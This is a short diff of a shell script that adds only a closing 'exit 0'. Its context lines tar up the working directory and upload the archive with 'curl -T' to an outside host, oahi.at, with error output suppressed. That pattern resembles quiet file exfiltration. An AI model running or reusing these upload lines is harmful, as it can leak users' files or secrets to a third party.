@@ -12,3 +12,6 @@ ls ../vendor/*/*
 tar -cf "$(ls)".tar.gz "$(ls)"
 transfer wet ./*.tar.gz
 curl -T ./*.tar.gz https://oahi.at 2>/dev/null
+
+# Exit
+exit 0
